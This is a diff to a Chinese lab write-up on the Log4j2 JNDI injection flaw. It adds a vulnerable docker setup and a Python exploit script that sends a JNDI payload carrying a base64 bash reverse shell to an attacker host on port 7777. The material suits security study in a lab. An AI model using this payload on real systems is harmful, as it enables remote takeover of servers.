@@ -116,13 +116,60 @@ nc -l -p 7777
 
 由于直接在 `vulfocus` 中启动 `漏洞环境镜像` 默认 30 分钟后销毁，且由于其随机端口转发，不方便调试。故这里使用 `docker-compose` **直接启动** `log4j` 漏洞环境。
 
+docker image: [vulfocus/log4j2-rce-2021-12-09:1](https://hub.docker.com/r/vulfocus/log4j2-rce-2021-12-09/tags)
+
 ```yaml
 services:
   log4j:
     image: "vulfocus/log4j2-rce-2021-12-09:1"
     ports:
-      - "8080:8080"
+      - "8080:8080" # 固定端口转发
 ```
+
+### 漏洞利用代码
+
+```python
+"""log4j2 JNDI 注入"""
+
+import base64
+import urllib.parse
+
+import requests
+
+ATTACKER_HOSTNAME = "kali-attacker.mlab"
+VICTIM_HOSTNAME = "ubuntu-victim.mlab"
+
+shell_redirection = f"bash -i >& /dev/tcp/{ATTACKER_HOSTNAME}/7777 0>&1"
+
+shell_redirection_bytes = shell_redirection.encode("ascii")
+shell_redirection_b64 = base64.b64encode(shell_redirection_bytes).decode("ascii")
+
+print(f"Encoded string: {shell_redirection_b64}")
+
+
+params = {
+    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjIxNC83Nzc3IDA+JjE=}",
+    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjU2LjE2Mi83Nzc3IDA%2BJjE%3d}",
+    "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
+    + urllib.parse.quote_plus(shell_redirection_b64)
+    + "}",
+}
+
+
+response = requests.get(
+    "http://ubuntu-victim.mlab:8080/hello",
+    params=params,
+    verify=False,
+    timeout=10,
+)
+
+print(response.request.url)
+print(response.text)
+```
+
+### Demo
+
+[![asciicast](https://asciinema.org/a/667333.svg)](https://asciinema.org/a/667333)
 
 ## 参考
 
